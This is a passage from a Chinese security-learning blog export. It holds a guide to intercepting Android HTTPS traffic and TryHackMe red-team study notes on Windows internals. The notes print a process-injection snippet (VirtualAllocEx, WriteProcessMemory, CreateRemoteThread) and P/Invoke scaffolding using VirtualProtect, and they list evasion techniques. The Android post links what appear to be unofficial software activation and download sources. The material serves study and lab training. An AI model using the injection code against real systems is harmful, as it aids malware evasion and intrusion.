(0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 228ms，最长 = 229ms，平均 = 228ms 手动添加路由表 1route ADD 18.201.0.14 MASK 255.255.255.255 172.19.84.1 再次 ping 测试 123456789101112131415161718PS D:\\tools&gt; ping 18.201.0.14 -n 10 正在 Ping 18.201.0.14 具有 32 字节的数据: 来自 18.201.0.14 的回复: 字节=32 时间=176ms TTL=64 来自 18.201.0.14 的回复: 字节=32 时间=174ms TTL=64 来自 18.201.0.14 的回复: 字节=32 时间=180ms TTL=64 来自 18.201.0.14 的回复: 字节=32 时间=177ms TTL=64 来自 18.201.0.14 的回复: 字节=32 时间=176ms TTL=64 来自 18.201.0.14 的回复: 字节=32 时间=175ms TTL=64 来自 18.201.0.14 的回复: 字节=32 时间=180ms TTL=64 来自 18.201.0.14 的回复: 字节=32 时间=176ms TTL=64 来自 18.201.0.14 的回复: 字节=32 时间=173ms TTL=64 来自 18.201.0.14 的回复: 字节=32 时间=174ms TTL=64 18.201.0.14 的 Ping 统计信息: 数据包: 已发送 = 10，已接收 = 10，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 173ms，最长 = 180ms，平均 = 176ms 有效果！说明 UU 加速器依赖的是在服务端的那一份大的白名单路由表。而我们测试的 THM 的 IP 段没加进路由，没法用。 其实我很好奇，难道 AWS 给游戏厂商服务器的段是专用的？不会和现有的重叠吗？我还心存侥幸的以为会有漏网之鱼呢，没想到一个都没有。 从这份结果就可以验证，从我现在所在区域到 THM 服务器，目前能达到的最快延迟是 173ms。","categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"}],"tags":[{"name":"OpenVPN","slug":"OpenVPN","permalink":"https://blog.irec.moe/tags/OpenVPN/"},{"name":"机场","slug":"机场","permalink":"https://blog.irec.moe/tags/%E6%9C%BA%E5%9C%BA/"}]},{"title":"Android 抓包配置 (Charles + Burp)","slug":"网络/20250904_Android_抓包配置/Android 抓包配置","date":"2025-09-03T16:00:00.000Z","updated":"2025-09-04T15:37:35.341Z","comments":true,"path":"/android_capture.html","permalink":"https://blog.irec.moe/android_capture.html","excerpt":"","text":"Android 抓包配置 (Charles + Burp)背景知识Android 系统是有两种证书类型的，Release 包默认只信任系统证书，而 Debug 包默认信任系统证书和用户证书。 我们要劫持 SSL 流量就必须要做到 MITM，然而我们 MITM 后的数据包内的证书需要设备信任，所以需要把我们的根证书加进系统信任的证书列表里。作为普通用户，正常途径只能添加用户证书，而 APP 是一般构建的是 Release 包，所以我们必须通过修改系统证书的方式来让我们的证书被信任。 在 Android 14 之后，证书需要放在 /system/etc/security/cacerts 和 /apex/com.android.conscrypt/cacerts 目录下，我提供的 magisk 模块能做到这点。 所需资源 需要一台有 Magisk 环境的手机L Charles 下载：https://www.charlesproxy.com/ 激活码：https://www.zzzmode.com/mytools/charles/ Burp：https://pan.baidu.com/s/1J_CUxLKqC0h3Ypg4sQV0_g 提取码：52pj module：https://blog.irec.moe/android_capture/reqable-magisk.zip Charles 配置激活步骤略。把 Proxy -&gt; Windows proxy 关掉，File -&gt; Clear session 一下。 导出根证书Help -&gt; SSL proxying -&gt; Save Charles Root certificate 保存一下根证书，如果有需要你也可以把根证书装你手机上。 找到刚刚的根证书目录，使用这条命令计算证书 Subject 的 Hash 值（Windows 使用 Git Bash），把输出的第一行作为文件名，改成这样的格式 b51d9383.0，这是用来创建证书的符号链接的。 1openssl x509 -subject_hash_old -in cert.pem 改名好之后，打开这个模块的安装包，把证书丢到这个目录下 reqable-magisk.zip\\system\\etc\\security\\cacerts。这个模块是从 reqable 里面提取出来的，因为现在的 Android system 目录是不可写的，所以需要这样一个模块来挂载证书。 丢进去之后，传到手机上用 Magisk 安装即可。重启之后可以在系统设置 -&gt; 信任的证书看到我们导入的证书。 .sfyphtohuvzn{zoom: 25%;} Charles SSL 配置找到 Proxy -&gt; SSL proxying settings 把 Enable SSL proxying 的勾打上，点击左下角的加号，Host 和 Port 都填写 * 手机端配置手机打开 WLAN 设置，找到你连接的 WiFi 详情，修改代理设置为手动。主机名填写运行 Charles 设备的 IP，端口填写 Charles 的监听端口（默认 8888）。 .voptucnbjeyr{zoom:25%;} 然后 Charles 会提示你是否允许连接请求，点击 Allow 即可。 PS: 这里 Charles 的 Access control 有 bug，不论我填 10.2.2.119 还是 10.2.2.0&#x2F;24 还是 0.0.0.0&#x2F;24 都不行，只能这样让他弹窗然后点 Allow。这里我手贱点了 Deny 然后怎么样都没法恢复了，只好在手机上换了个 IP。 到这里你就能截获 SSL 流量了，你可以在 Charles 的主界面的左边的 sitemap 看到有动静。 不过仅仅抓包对我来说是不够的，我需要使用 Burp 对数据包进行修改。 Charles 转发到 Burp 配置找到 Proxy -&gt; External proxying settings 把 Web Proxy (HTTP) 和 Secure Web Proxy 都打上，目的地址填 Burp 的监听地址和端口（默认8080），这里我 Charles 和 Burp 都运行在本机，所以用 127.0.0.1。 保存之后你就能在 Burp 里面看到数据包了，接下来就是你自己探索的时间了。 Enjoy~ 参考资料Android14设置Charles证书为系统根证书 Reqable","categories":[{"name":"网络","slug":"网络","permalink":"https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"抓包","slug":"抓包","permalink":"https://blog.irec.moe/tags/%E6%8A%93%E5%8C%85/"},{"name":"Android","slug":"Android","permalink":"https://blog.irec.moe/tags/Android/"}]},{"title":"Try Hack Me - Red Teaming","slug":"THM/20250818_Red_Teaming/Red_Teaming","date":"2025-08-29T16:00:00.000Z","updated":"2025-09-20T10:28:45.209Z","comments":true,"path":"/thm_rthe.html","permalink":"https://blog.irec.moe/thm_rthe.html","excerpt":"","text":"这是 TryHackMe Red Teaming Path 的 Host Evasions 部分，因为我是从 JR -&gt; WAP -&gt; Offensive Pentesting 这样学过来的，所以前面的很多房间学完了，AD 也在 OP 里面学完了，所以就这一部分没学。 全都是 Windows 相关的知识，学起来挺费劲的，对于从来没有接触过 C# 的我来说有点懵逼，特别是 Windows 那些非托管代码的用法一个都不知道，从来没有接触过 Windows 开发，不过还好，房间讲的很细，同时也要靠自己的主观性去搜不懂的有疑问的知识点，网上资源很多。我学习的过程中并不是仅限于房间内的资源，还会拓展很多的。 还是和 Offensive Pentesting 一样，建议这篇文章作为官方 WP 的补充来阅读。 Windows Internals这个房间主要介绍了有关进程，可执行文件相关的东西，大体是让我们掌握这些的概念，不至于懵懵懂懂，相对来说还是挺好理解的。 Process一个应用程序包含多个进程，一个进程又由多个组件组成。文档把这些组件分解为每个进程提供执行程序所需要的资源。 进程是通过执行应用程序创建的，Windows 的大部分功能都可以视为一个应用程序，拥有相应的进程。攻击者可以利用这些合法的进程进行攻击，以逃避检测。以下是一些进程攻击方法： Process Injection（进程注入） (T1055) Process Hollowing（进程镂空） (T1055.012) Process Masquerading（进程伪装） (T1055.013) 一个进程具有虚拟地址空间、可执行代码、打开系统对象的句柄、安全上下文、唯一的进程标识符、环境变量、优先级类、最小和最大工作集大小，以及至少一个执行线程。 进程组件 作用 私有虚拟内存空间 分配给进程的虚拟内存地址 可执行程序 定义存储在虚拟内存空间中的代码和数据 打开的句柄 定义进程可访问的系统资源的句柄 安全上下文 访问令牌定义了用户， 安全组，权限和其他安全信息 进程 ID 每个进程独有的数字标识符 线程 进程计划执行的部分 我们也可以在较低的层面上解释一个进程，因为它驻留在虚拟地址空间中。下表和图表描述了进程在内存中的样子。 组件 作用 代码 将要被进程执行的代码 全局变量 存储的变量 进程堆 定义存储数据的堆 进程资源 定义进程未来的资源 环境块 定义线程信息的数据结构 这些信息说实话有点抽象了，但是我们能用任务管理器观察到他们实际的存在。这些数据是用户和攻击者最常操纵的内容。 **Value&#x2F;Component ** **Purpose ** Example 名称 定义进程的名字，一般是进程 exe 的 名字 conhost.exe PID 每个进程独有的数字标识符 7408 状态 进程的运行状态（运行中，暂停等） Running 用户名 启动进程的用户，代表进程拥有的权限 SYSTEM 这里的问题就问了一些进程的 PID 相关，还有一个进程的完整性级别，之前做 Windows AD 里面碰到过。 Threads线程是进程的一个可执行单元，线程与其父进程共享相同的详细信息和资源，例如代码、全局变量等。线程也有其独特的数值和数据，如下表所示。 Component Purpose 栈 线程相关的所有数据（异常，过程调用等） 线程局部存储 分配独立数据环境的储存空间的指针 栈参数 每个线程分配的独立的值 上下文结构 保存内核维护的机器寄存器的值 题目这里说实话把我绕住了，首先第一问问的是 notepad.exe 创建时，操作系统为它自动生成的第一个线程的唯一 ID 是什么。第二问是前一个线程的栈参数是什么，其实答案是是哪个线程 ID 创建了接下来的 notepad.exe。 Virtual memory虚拟内存为每个进程提供一个私有虚拟内存空间。内存管理器用来将虚拟内存地址映射到物理地址的。拥有虚拟内存空间可以不直接写入物理内存，这样进程就减小碰撞风险了。内存管理器使用的是页来传输内存。所以应用程序用的虚拟内存可能会多于实际的物理内存。同时还会将页面虚拟内存移到磁盘（SWAP），以解决内存不够用的问题，提升系统效率，下图是示例。 32 位系统理论虚拟地址空间极限是 4GB。这个地址空间被一分为二，下半部分（0x00000000 - 0x7FFFFFFF）所述分配给进程。上半部分（0x80000000 - 0xFFFFFFFF）分配给操作系统内存使用。管理员可以设置 (increaseUserVA) 或者 AWE (Address Windowing Extensions) 来解决需要更大地址空间的应用程序。64 位系统的理论极限是 256TB。 可以看看 Windows XP，还有 Windows Server 2003 那些开启 4G 内存支持的文章。小时候自己也折腾过，开了一个 PAE，然后把没用到的内存开一个虚拟磁盘，然后在那个虚拟盘上开一个 SWAP。 Dynamic Link Libraries这一节就是讲动态链接库了，和后面的几个房间都相关。 官方文档：What is a DLL DLL 在我看来和 JavaScript Python 那些包的概念类似，它们实现了代码重用和模块化。不过 DLL 是编译好的，当然语言类型不同这些也应该不一样。 DLL 作为一个程序中所要用到的函数被加载，因为这个程序依赖 DLL，攻击者就可以针对 DLL 而不是应用程序本身来攻击，相当于把这个方法劫持了，以下是 MTIRE 攻击向量： DLL Hijacking（DLL 劫持） (T1574.001) DLL Side-Loading（DLL 侧载） (T1574.002) DLL Injection（DLL 注入） (T1055.001) 新版 QQ 使用 betterqqnt 那种方法我觉得应该是 DLL 劫持，因为他把恶意的 dbghelp.dll 文件丢到那个目录下，然后程序默认就会运行并且执行这个 DLL 里面的方法（我猜的）。 DLL 的创建与任何其他项目&#x2F;应用程序并无不同；它们只需要稍作语法修改即可工作。下面是来自 Visual C++ Win32 动态链接库项目 的一个 DLL 示例。 1234567891011121314151617181920#include &quot;stdafx.h&quot; #define EXPORTING_DLL #include &quot;sampleDLL.h&quot; // 这个函数是每个 DLL 文件必须包含的入口点函数，他是由 Windows 操作系统自动调用 // hModule (DLL 的句柄)：操作系统告诉 DLL “这就是你自己的身份令牌”。DLL 可以用这个令牌来找到自己的位置，或者在需要时加载自己内部的资源。 // ul_reason_for_call (被调用的原因)：操作系统告诉 DLL “我找你是因为一个新进程加载了你”，或者“一个线程正在退出，所以你需要做一些清理工作”。DLL 可以根据这个参数来决定它应该执行什么代码。 // lpReserved (保留参数)：操作系统告诉 DLL “这个参数暂时不用，但将来可能会用，请不要动它”。 // DWORD = unsigned long // BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { // 这段代码中 DLLMain 没有执行任何参数，只是返回 TRUE，意味着他在 DLL 加载和卸载的时候不做任何初始化和清理工作 return TRUE; } void HelloWorld() { MessageBox( NULL, TEXT(&quot;Hello World&quot;), TEXT(&quot;In a DLL&quot;), MB_OK); } DWORD ul_reason_for_call 1 (或 DLL_PROCESS_ATTACH)：DLL 刚刚被一个新进程加载。 2 (或 DLL_THREAD_ATTACH)：DLL 所在的进程里创建了一个新线程。 3 (或 DLL_THREAD_DETACH)：DLL 所在的进程里有一个线程退出了。 0 (或 DLL_PROCESS_DETACH)：DLL 即将被进程卸载。 下面是该 DLL 的头文件，通常会保存在一个名为 sampleDLL.h 的头文件中，并被其他源代码文件引用。它将定义导入和导出的函数。 123456789#ifndef INDLL_H #define INDLL_H #ifdef EXPORTING_DLL extern __declspec(dllexport) void HelloWorld(); #else extern __declspec(dllimport) void HelloWorld(); #endif #endif 加载 DLLDLL 可以使用加载时动态链接或运行时动态链接加载到程序中。 加载时动态链接 load-time dynamic linking当使用加载时动态链接加载时，应用程序会显式调用 DLL 函数。只有通过提供头文件 .h 和导入库文件 .lib 才能实现这种类型的链接。下面是一个从应用程序调用导出的 DLL 函数的示例。 12345678#include &quot;stdafx.h&quot; // 这里显式的导入了我们的文件 #include &quot;sampleDLL.h&quot; int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { HelloWorld(); return 0; } 运行时动态链接 run-time dynamic linking当使用运行时动态链接加载时，会使用一个单独的函数（LoadLibrary 或 LoadLibraryEx）在运行时加载 DLL。加载后，你需要使用GetProcAddress 来识别要调用的导出的 DLL 函数。下面是一个在应用程序中加载和导入 DLL 函数的示例。 1234567891011121314151617181920212223... // 这行代码定义了一个新的函数指针类型，名为 DLLPROC。这个类型的函数指针不返回任何值（VOID），并且接受一个字符串参数（LPTSTR） typedef VOID (*DLLPROC) (LPTSTR); ... // 这行声明了一个名为 HelloWorld 的函数指针变量，它的类型是我们上面定义的 DLLPROC DLLPROC HelloWorld; // HINSTANCE 是一个句柄类型，用于存储加载的 DLL 模块的实例句柄。它代表了 DLL 在内存中的位置 HINSTANCE hinstDLL; // 一个布尔变量，用于存储 FreeLibrary 函数的返回值，以检查操作是否成功 BOOL fFreeDLL; // 加载 DLL，如果成功加载，会返回一个模块句柄给 hinstDLL，失败返回 NULL hinstDLL = LoadLibrary(&quot;sampleDLL.dll&quot;); if (hinstDLL != NULL) { // 它在已经加载的 DLL 模块中查找并返回 HelloWorld 的内存地址。 HelloWorld = (DLLPROC) GetProcAddress(hinstDLL, &quot;HelloWorld&quot;); if (HelloWorld != NULL) // 调用函数指针的。它执行 HelloWorld 指针所指向的代码，也就是 sampleDLL.dll 中的 HelloWorld 函数 (HelloWorld); // 释放 DLL fFreeDLL = FreeLibrary(hinstDLL); } ... TBH，这个代码把我绕了一会才看懂，如果没有 C 基础的话很坐牢的，不过梳理了一下把指针又复习了一遍就解决了，就拿上面代码中的这几行来解释： 12345678910111213141516// 这里是定义一个名字叫 DLLPROC 的“函数指针类型” typedef VOID (*DLLPROC) (LPTSTR); // 原代码 // 这里是执行一个强制转换的功能 // 将一个通用指针的类型，安全地转换为一个特定的（DLLPROC）函数指针类型。 HelloWorld = (DLLPROC) GetProcAddress(hinstDLL, &quot;HelloWorld&quot;); // 第一种 // 编译器会抛出一个错误，告诉你“不能将一个地址解引用（dereference）为 DLLPROC 类型。” // 这里的 * 试图解引用这个地址，尝试读取这个地址中的“值” HelloWorld = *(DLLPROC) GetProcAddress(hinstDLL, &quot;HelloWorld&quot;); // 第二种 // 不能在类型转换的括号里使用 * 符号 HelloWorld = (*DLLPROC) GetProcAddress(hinstDLL, &quot;HelloWorld&quot;); 在恶意代码中，通常会更多地使用运行时动态链接，而非加载时动态链接，但是具体的加载时动态链接案例没讲。 Portable Executable FormatPE（Portable Executable，可移植可执行文件）格式是可执行文件和对象文件的总体结构。PE 和 COFF（Common Object File Format，通用对象文件格式）文件构成了 PE 格式。 PE 数据的结构的解释如下： DOS 头部 定义了文件的类型，MZ DOS 头将文件格式定义为 .exe。 **DOS Stub **是文件开头默认运行的一个程序，它会打印一条兼容性消息。这对于大多数用户来说不会影响文件的任何功能。当文件在旧的 DOS 系统中运行时，这个小程序会执行并打印那条经典的“This program cannot be run in DOS mode.”（本程序不能在 DOS 模式下运行）消息。在现代 Windows 系统中，这一部分会被忽略。 **PE 头部（PE Header）**也叫 NT 头 IMAGE_NT_HEADERS PE 签名是一个固定的 DWORD 值 0x50450000（即 “PE\\0\\0”），用于正式标识文件为 PE 格式。 **文件头（File Header）**提供了二进制文件的 PE 头信息，它定义了文件的格式，包含签名和镜像文件头，目标机器类型（32 位还是 64 位）、节的数量、时间戳等。 **可选文件头（Optional Header）**的名称具有欺骗性，它是 PE 文件头的重要组成部分。它包含了加载器所需的最重要信息，比如程序入口点、代码和数据的基址等。 **数据目录（Data Directories）**它是可选文件头的一部分，是一个数组，数组中的每个条目都指向一个重要的数据结构，比如导入表、导出表、资源表等。 **节头部表（Section Header）**提供了每个节的元数据，比如名称、在文件中的位置、在内存中的位置、大小和权限等。 节（Sections）是文件的实际内容。每个节都有不同的作用和权限。 部分 作用 .text 包含可执行代码和入口点 .data 包含已初始化数据（字符串、变量等）。 .rdata or .idata 包含导入（Windows API）和 DLL。 .reloc 包含重定位信息 .rsrc 包含应用程序资源（图像等） .debug 包含调试信息 一个 .exe 文件是由 DOS 头 + PE 头 + 节组成的，一个标准的 PE 文件在内存中的布局是这样的： DOS 头 (IMAGE_DOS_HEADER) DOS 存根 (DOS Stub) PE 签名 (PE\\0\\0) NT 头 (IMAGE_NT_HEADERS) 节头列表 (IMAGE_SECTION_HEADER 数组) 节内容 (.text, .data 等) 想要了解更多可以看看这个文章：PE文件结构解析 Interacting with Windows Internals这一节就是讲 Windows API 这些了，然后说了一下用户态和内核态这些。 大多数 Windows 内部组件都需要与物理硬件和内存交互，应用程序默认情况下通常无法与内核交互或修改物理硬件，并且需要一个接口实现这些。 User mode Kernel Mode 无法直接访问硬件 直接访问硬件 在私有虚拟地址空间中创建进程 在单个共享虚拟地址空间中运行 访问“已拥有内存位置” 访问整个物理内存 在用户模式或 “userspace” 中启动的应用程序将保持在该模式。当应用程序需要执行一个只有内核才能完成的操作时（例如：读写文件、创建新进程、网络通信等），它会发出一个系统调用请求，这个系统调用就是那个“切换点”的触发器。具体流程参考下图。 当 C# 这样的语言想要调用 Win32 API 时，它不会直接调用。它的代码会先被 CLR（Common Language Runtime）接管。CLR 会负责将中间代码翻译成机器码，并且在必要的时候，由 CLR 去调用底层的 Win32 API 来与操作系统交互。 所以，这个过程可以看作是一个“间接”调用：你的 C# 代码 → CLR → Win32 API → 操作系统 而不是：你的 C# 代码 → Win32 API → 操作系统 CLR 类似 Java Runtime 这样的东西，他也是提供了一个运行时，提供了自动垃圾回收、类型安全检查等功能。 注入弹窗到进程中我们将把一个消息框注入到本地进程中，以演示与内存交互的 PoC，将消息框写入内存的步骤如下所述： 为消息框分配本地进程内存。 将消息框写入&#x2F;复制到已分配的内存中。 从本地进程内存执行消息框。 第一步，我们可以使用 OpenProcess 获取指定进程的句柄。 123456// 获取一个进程的句柄 HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, // 定义访问的权限 FALSE, // 目标句柄不可被继承，我们创建的子程序不带权限 DWORD(atoi(argv[1])) // 读取用户在命令行输入的进程号，转为 int ); 第二步，我们可以使用 VirtualAllocEx 分配一个带有有效载荷缓冲区的内存区域。 123456789// VirtualAllocEx 在指定进程中分配、预留或释放内存 // remoteBuffer 存储这个新分配区域的地址 remoteBuffer = VirtualAllocEx( hProcess, // 打开的目标进程的句柄 NULL, // 操作系统来决定分配内存的最佳位置 sizeof payload, // 内存分配区域的大小 (MEM_RESERVE | MEM_COMMIT), // 预留然后提交 PAGE_EXECUTE_READWRITE // 对提交区域开启执行和读写权限 ); 第三步，我们可以使用 WriteProcessMemory 将有效载荷写入已分配的内存区域。 1234567WriteProcessMemory( hProcess, // 打开的目标进程的句柄 remoteBuffer, // 上一步分派的内存区域 payload, // 要写入的数据 sizeof payload, // 数据的字节大小 NULL // 不返回实际写入的字节数 ); WriteProcessMemory的完整函数签名是这样的： 1BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten ); lpNumberOfBytesWritten：这个参数是一个可选的指针。如果你传入一个有效的地址，WriteProcessMemory 函数会将实际写入的字节数写入到这个地址。 NULL：当你传入 NULL 时，就表示你不关心实际写入了多少字节，你只希望函数执行写入操作。 第四步，我们可以使用 CreateRemoteThread 从内存中执行我们的有效载荷。 1234567891011// CreateRemoteThread：这个函数是 Windows API 中最经典的远程线程创建函数。它在目标进程内创建一个新的线程。 // remoteThread：一个 HANDLE 类型的变量，它将存储新创建的线程的句柄。有了这个句柄，你就可以控制这个线程，例如等待它完成或终止它。 remoteThread = CreateRemoteThread( hProcess, // 打开的目标进程的句柄，也就是要在哪个进程里面创建线程 NULL, // 这个参数是用来设置线程的安全属性的，传入 NULL 表示使用默认的安全描述符。 0, // 栈的默认大小 (LPTHREAD_START_ROUTINE)remoteBuffer, // 这是一个类型转换，它告诉 CreateRemoteThread，remoteBuffer 指向的是一个线程可以开始执行的函数。 NULL, // 这是传递给新线程的参数。如果你的注入代码（payload）需要一个参数，就会在这里传入。 0, // 传入 0 表示线程创建后立即开始执行。 NULL // 一个可选参数，用于接收新线程的 ID。传入 NULL 表示你不关心新线程的 ID。 ); 这个房间需要一些 Windows 开发相关的知识，如果不懂那些，光靠房间本身的解释是不够的，尤其是那些方法签名。房间只给你写好了示例，但是不给你解释每个方法形参的详细作用，导致理解很困难，上面的大部分都是靠 AI 来帮忙来理解的，光记录这个房间就用了我一下午的时间，不过收获很大。 Introduction to Windows API这个房间呢，则是介绍了 Windows API 的组成，和一些调用 API 的方式，总体来说是概念为主，告诉了我们大部分攻防措施都是通过 API 来实现的，比如说 Hook API 以监测 API 的调用。这个房间要对操作系统架构有一个概念性的理解，就是那个操作系统分层模型。 Windows API 的组成部分自上而下分解 Windows API Layer Explanation API 一个顶层&#x2F;通用术语或理论，用于描述在 win32 API 结构中找到的任何调用。 Header files or imports 定义了在运行时导入的库，这些库由头文件或库导入定义。使用指针获取函数地址。 Core DLLs 定义调用结构的四个 DLL 组。（KERNEL32、USER32 和 ADVAPI32）。这些 DLL 定义了不包含在单个子系统中的内核和用户服务。 Supplemental DLLs Windows API 中定义的其他 DLL。控制 Windows 操作系统的独立子系统。约 36 个其他已定义的 DLL。（NTDLL、COM、FVEAPI 等） Call Structures 定义 API 调用本身和调用的参数。 API Calls 程序中使用的 API 调用，其函数地址通过指针获取。 In&#x2F;Out Parameters 由调用结构定义的参数值。 OS Libraries 系统库Win32 库的每个 API 调用都驻留在内存中，需要一个指向该函数的内存地址的指针。由于 ASLR（地址空间布局随机化），没法直接定位到这个函数，所以需要程序通过一个特定的机制去动态的定位这些函数的地址。比如说在 DLL 加载到内存后，通过 GetProcAddress 去查询需要的函数名，以获取他的内存地址。 Windows Header File 头文件微软发布了 Windows 头文件，解决因为 ASLR 获取不到 API 地址的解决方案。 我们在编写自己的程序中，可以导入 windows.h 。他包含了几乎所有 Win32 API 函数的声明、数据类型和宏定义。它告诉你的程序，像 MessageBox、CreateRemoteThread 这样的函数是存在的，以及它们的参数和返回值类型。 在运行时，通过操作系统提供的动态加载机制（例如 LoadLibrary 和 GetProcAddress），我们能根据函数名动态地找到它的真实地址。 P&#x2F;Invoke 机制和托管代码我们之前聊过，像 C# 这样的托管代码（Managed Code）运行在 CLR (Common Language Runtime) 之下。CLR 会管理内存、提供垃圾回收，并保护你免受很多底层错误的困扰。 而 Win32 API 是 非托管代码（Unmanaged Code），它直接与操作系统交互，不被 CLR 管理。 如果你的 C# 程序想调用一个 Win32 API 函数（例如 MessageBoxA），它不能直接调用，因为它们属于不同的“世界”。这个过程就像你在写 C++ 代码中用到汇编代码一样（ffmpeg）。 下面的代码从系统运行时里面导入了 InteropServices 命名空间，里面有一个 DllImport 特性，后面会紧跟着一个函数声明，这个声明告诉运行时，在 user32.dll 中有一个叫 MessageBox 的函数，它接受一些参数，并返回一个整数。 只要声明之后就可以在 C# 代码中直接像调用普通方法一样调用 MessageBox。extern 关键字告诉 C# 编译器，这个函数不是在当前代码文件中实现的。 当你使用 [DllImport] 特性时，你实际上是在创建一个外部方法的声明。这个声明需要用 extern 关键字来修饰，因为它所指向的实际代码位于非托管的 DLL 文件中。 12345678910111213using System; // 导入了 InteropServices 命名空间，它包含了所有与托管和非托管代码交互相关的类和特性，包括 DllImport using System.Runtime.InteropServices; public class Program { // &quot;user32.dll&quot;: 指定了我们要从哪个 DLL 文件中导入函数。user32.dll 是 Windows 操作系统的一个核心 DLL，包含了图形用户界面相关的函数，比如 MessageBox。 // CharSet = CharSet.Unicode: 这个参数告诉运行时，在调用非托管函数时，字符串应该使用 Unicode 字符集。 // SetLastError = true: 这是一个非常重要的参数，它告诉运行时，在调用非托管函数后，如果函数失败了，要保存 Windows 系统的错误代码。你可以通过 Marshal.GetLastWin32Error() 方法来获取这个错误代码。 [DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Unicode, SetLastError = true)] private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType); } 现在就可以把这个函数当成托管方法调用了，尽管他是非托管方法。 API Call Structure API 调用结构API 调用是 Win32 库的第二个主要组成部分。具体的 Win32 API 调用可以参考 Windows API documentation 和 pinvoke.net。 附加字符API 调用功能可以通过附加一个代表性字符来扩展，这是微软 Win32 API 函数的命名约定，我们作为开发者只需要按照这个命名规则去调用正确的函数版本。 字符 解释 A 表示使用 ANSI 编码的 8 位字符集 W 代表 Unicode 编码 Ex 为 API 调用提供扩展功能或输入&#x2F;输出参数 更多示例参考微软文档：Working with Strings，这个功能是为了向后兼容性准备的。 在之后的实践中你就会碰到很多问题了，比如说在 C 程序中，用的是 ANSI 编码，然后提供的函数没有 A 结尾的，就要手动处理函数类转换了。 方法签名每个 API 调用都有预定义的结构来定义其输入&#x2F;输出参数。你可以在 Windows API index 中相应的 API 文档里面找到。 下面是 WirteProcessMemory API 调用的示例，官方文档：WriteProcessMemory function (memoryapi.h) 1234567BOOL WriteProcessMemory( [in] HANDLE hProcess, [in] LPVOID lpBaseAddress, [in] LPCVOID lpBuffer, [in] SIZE_T nSize, [out] SIZE_T *lpNumberOfBytesWritten ); [in] hProcess: 要修改的进程内存的句柄。该句柄必须对进程具有 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。 [in] lpBaseAddress: 一个指向指定进程中要写入数据的基地址的指针。在数据传输发生之前，系统会验证基地址和指定大小内存中的所有数据是否可用于写入访问，如果不可访问，则函数失败。 [in] lpBuffer: 一个指向缓冲区的指针，该缓冲区包含要写入指定进程地址空间的数据。 [in] nSize: 要写入指定进程的字节数。 [out] lpNumberOfBytesWritten: 一个指向变量的指针，该变量接收传输到指定进程的字节数。此参数是可选的。如果 lpNumberOfBytesWritten 为 NULL，则忽略该参数。 上一个房间用过这个函数，这里就把文档里的每个参数的作用复制过来了，最主要还是得看文档。 API Implementations API 实现API 实现在 C 中Microsoft 为 C 和 C++ 等低级编程语言提供了一套预配置的库，我们可以使用这些库来访问所需的 API 调用。这个就是上上节讲的 windows.h 文件，在我们的程序开头添加一个 #include &lt;windows.h&gt; ，导入进来就行。 下面是一个使用 CreateWindowExA 创建一个标题为“Hello THM!”的弹出窗口的示例，文档地址：CreateWindowExA function (winuser.h) 1234567891011121314151617181920212223242526272829// HWND 是窗口句柄 // CreateWindowExA 方法签名 HWND CreateWindowExA( [in] DWORD dwExStyle, // 窗口扩展样式（比如是否是工具窗口、是否是浮动窗口等） [in, optional] LPCSTR lpClassName, // 指定创建的窗口的类型或模板 [in, optional] LPCSTR lpWindowName, // 窗口标题 [in] DWORD dwStyle, // 窗口的标准样式（比如是否有最大化按钮、是否可以调整大小等） [in] int X, // X position [in] int Y, // Y position [in] int nWidth, // Width size [in] int nHeight, // Height size [in, optional] HWND hWndParent, // 父窗口 [in, optional] HMENU hMenu, // 菜单 [in, optional] HINSTANCE hInstance, // 与窗口关联的模块实例的句柄 [in, optional] LPVOID lpParam // 指向一个值的指针，允许你将一个自定义的数据结构传递给窗口 ); // 具体的调用代码 HWND hwnd = CreateWindowsEx( 0, CLASS_NAME, L&quot;Hello THM!&quot;, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL ); CreateWindowEx 是 CreateWindow 的增强版本。 基础版本：CreateWindow。它提供了一组基本的窗口样式参数（dwStyle），足以创建大多数常见的窗口。 扩展版本：CreateWindowEx。它在 CreateWindow 的基础上，额外添加了一个 dwExStyle 参数，提供了更多特殊或高级的窗口样式。 API 实现在 .NET and PowerShell 中下面是一个示例应用程序，它使用 API 获取运行该应用程序的设备的计算机名和其他信息。 为了让 P&#x2F;Invoke 代码在 32 位和 64 位系统上都能正确编译和运行，开发者会选择使用 IntPtr 来映射这些可变大小的指针和句柄。HANDLE 在 32 位系统上是 4 字节，在 64 位系统上是 8 字节。为了让 P&#x2F;Invoke 代码在 32 位和 64 位系统上都能正确编译和运行，开发者会选择使用 IntPtr 来映射这些可变大小的指针和句柄。 1234567891011121314class Win32 { [DllImport(&quot;kernel32&quot;)] // 这里用 bool 来接收也可以，这个函数是返回成功与否 // 我也不清楚为什么给的 demo 用的 IntPtr 接收 public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize); } static void Main(string[] args) { bool success; StringBuilder name = new StringBuilder(260); uint size = 260; success = GetComputerNameA(name, ref size); Console.WriteLine(name.ToString()); } 现在来介绍相同的方法如何在 PowerShell 中实现，我们需要创建一个方法而不是一个类，并添加一些额外的运算符。 12345678$MethodDefinition = @&quot; [DllImport(&quot;kernel32&quot;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(&quot;kernel32&quot;)] public static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport(&quot;kernel32&quot;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); &quot;@; 这些调用现在已定义，但 PowerShell 在初始化它们之前还需要一个步骤。我们必须为方法定义中每个 Win32 DLL 的指针创建一个新类型。函数 Add-Type 将在 /temp 